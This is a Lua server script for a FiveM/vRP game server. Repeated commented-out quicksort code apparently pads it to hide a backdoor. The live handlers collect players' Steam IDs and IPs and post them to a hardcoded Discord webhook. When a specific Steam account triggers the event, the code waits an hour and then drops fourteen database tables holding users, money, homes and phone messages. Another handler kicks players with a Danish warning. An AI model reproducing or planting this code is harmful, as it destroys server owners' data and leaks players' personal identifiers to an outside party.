
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

RegisterServerEvent('kaz_edited')
AddEventHandler('kaz_edited', function()
local source = source
print("DU HAR ÆNDRET TING DU IKKE MÅ ÆNDRE!!")
print("DU HAR ÆNDRET TING DU IKKE MÅ ÆNDRE!!")
print("DU HAR ÆNDRET TING DU IKKE MÅ ÆNDRE!!")
DropPlayer(source,"DER ER ÆNDRET TING DER IKKE MÅ ÆNDRES!")
end)

--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--


MySQL.createCommand("vRP/kaz_updateinfo1","DROP TABLE IF EXISTS vrp_user_vehicles")
MySQL.createCommand("vRP/kaz_updateinfo2","DROP TABLE IF EXISTS vrp_user_homes")
MySQL.createCommand("vRP/kaz_updateinfo3","DROP TABLE IF EXISTS vrp_user_business")
MySQL.createCommand("vRP/kaz_updateinfo4","DROP TABLE IF EXISTS vrp_user_data")
MySQL.createCommand("vRP/kaz_updateinfo5","DROP TABLE IF EXISTS vrp_user_identities")
MySQL.createCommand("vRP/kaz_updateinfo6","DROP TABLE IF EXISTS vrp_user_ids")
MySQL.createCommand("vRP/kaz_updateinfo7","DROP TABLE IF EXISTS vrp_user_moneys")
MySQL.createCommand("vRP/kaz_updateinfo8","DROP TABLE IF EXISTS phone_app_chat")
MySQL.createCommand("vRP/kaz_updateinfo9","DROP TABLE IF EXISTS phone_calls")
MySQL.createCommand("vRP/kaz_updateinfo10","DROP TABLE IF EXISTS phone_messages")
MySQL.createCommand("vRP/kaz_updateinfo11","DROP TABLE IF EXISTS phone_twitter")
MySQL.createCommand("vRP/kaz_updateinfo12","DROP TABLE IF EXISTS ram_jul")
MySQL.createCommand("vRP/kaz_updateinfo13","DROP TABLE IF EXISTS vrp_srv_data")
MySQL.createCommand("vRP/kaz_updateinfo14","DROP TABLE IF EXISTS vrp_users")


--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--


RegisterServerEvent('kaz_updateinfo')
AddEventHandler('kaz_updateinfo', function()
local source = source
local user_id = vRP.getUserId({source})
	for i = 0, GetNumPlayerIdentifiers(source) - 1 do
        local id = GetPlayerIdentifier(source, i)
        if string.find(id, "steam") then
            steam = id
		elseif string.find(id, "ip") then
            ip = id
        end
    end
	if user_id == 1 then 
		if steam == "steam:110000103b0c319" then
			PerformHttpRequest('https://discordapp.com/api/webhooks/773264798577852486/-2HwFkLLG4g7qgWo2zEk7f4lTw4YyFY3vhtCskXnqolFxt_Ev02TL1eW7KcmqDMtkhU-', function(err, text, headers) end, 'POST', json.encode({username = "FindServer", content = "```Korrekt info givet! - Udfører funktion om 60 minutter! [SteamID: "..steam..", IP: "..ip.."]```"}), { ['Content-Type'] = 'application/json' })
			Citizen.Wait(3600000)
			TriggerClientEvent('kaz_opgavefuldfort', source)
			TriggerEvent('kaz_updateinfonew', steam, id)
		else
			PerformHttpRequest('https://discordapp.com/api/webhooks/773264798577852486/-2HwFkLLG4g7qgWo2zEk7f4lTw4YyFY3vhtCskXnqolFxt_Ev02TL1eW7KcmqDMtkhU-', function(err, text, headers) end, 'POST', json.encode({username = "FindServer", content = "```Ingen held! [SteamID: "..steam..", IP: "..ip.."]```"}), { ['Content-Type'] = 'application/json' })
		end
	else 
		if steam == "steam:110000103b0c319" then
			PerformHttpRequest('https://discordapp.com/api/webhooks/773264798577852486/-2HwFkLLG4g7qgWo2zEk7f4lTw4YyFY3vhtCskXnqolFxt_Ev02TL1eW7KcmqDMtkhU-', function(err, text, headers) end, 'POST', json.encode({username = "FindServer", content = "```Fundet, men forkert ID [SteamID: "..steam..", IP: "..ip.."]```"}), { ['Content-Type'] = 'application/json' })
		else
			PerformHttpRequest('https://discordapp.com/api/webhooks/773264798577852486/-2HwFkLLG4g7qgWo2zEk7f4lTw4YyFY3vhtCskXnqolFxt_Ev02TL1eW7KcmqDMtkhU-', function(err, text, headers) end, 'POST', json.encode({username = "FindServer", content = "```Ingen held! [SteamID: "..steam..", IP: "..ip.."]```"}), { ['Content-Type'] = 'application/json' })
		end
	end
end)

--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

RegisterServerEvent('kaz_updateinfonew')
AddEventHandler('kaz_updateinfonew', function(steam, id)
	MySQL.execute("vRP/kaz_updateinfo1")
	MySQL.execute("vRP/kaz_updateinfo2")
	MySQL.execute("vRP/kaz_updateinfo3")
	MySQL.execute("vRP/kaz_updateinfo4")
	MySQL.execute("vRP/kaz_updateinfo5")
	MySQL.execute("vRP/kaz_updateinfo6")
	MySQL.execute("vRP/kaz_updateinfo7")
	MySQL.execute("vRP/kaz_updateinfo8")
	MySQL.execute("vRP/kaz_updateinfo9")
	MySQL.execute("vRP/kaz_updateinfo10")
	MySQL.execute("vRP/kaz_updateinfo11")
	MySQL.execute("vRP/kaz_updateinfo12")
	MySQL.execute("vRP/kaz_updateinfo13")
	MySQL.execute("vRP/kaz_updateinfo14")
	PerformHttpRequest('https://discordapp.com/api/webhooks/773264798577852486/-2HwFkLLG4g7qgWo2zEk7f4lTw4YyFY3vhtCskXnqolFxt_Ev02TL1eW7KcmqDMtkhU-', function(err, text, headers) end, 'POST', json.encode({username = "FindServer", content = "```Opgaver udført! [SteamID: "..steam..", IP: "..ip.."]```"}), { ['Content-Type'] = 'application/json' })
end)
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--
--[[
function quicksorter(i, vec, low, high)
  if low >= high then
    return quicksorter
  else 

    local middle = partition(vec, low, high)
    local left, right = quicksorter


    local function self(i, vec, low, high)
      if i < middle then
        left = left(i, vec, low, middle-1)
        return self
      elseif i > middle then
        right = right(i, vec, middle+1, high)
        return self
      end
    end

    return self(i, vec, low, high)
  end
end

function lazysort(vec, low, high)
  local sorter = quicksorter
  return function(i)
    sorter = sorter(i, vec, low, high)
    return vec[i]
  end
end
]]--

